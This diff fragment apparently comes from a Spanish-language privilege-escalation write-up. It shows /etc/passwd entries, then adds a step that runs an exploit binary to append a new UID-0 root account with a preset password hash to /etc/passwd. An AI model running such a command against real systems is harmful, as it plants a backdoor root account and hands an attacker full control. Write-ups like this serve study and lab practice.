@@ -71,3 +71,9 @@ mysql:x:101:103:MySQL Server,,,:/var/lib/mysql:/bin/false
 sshd:x:102:65534::/var/run/sshd:/usr/sbin/nologin
 user:x:1000:1000:Debian Live user,,,:/home/user:/bin/bash
 ```
+
+
+```bash
+# lanzo el exploit:
+./d /etc/passwd "nuevoUsuario:$1$s54.Sc0j$66qZvulvJf.YvSlLD6LSe.:0:0:root:/root:/bin/bash\n"
+```
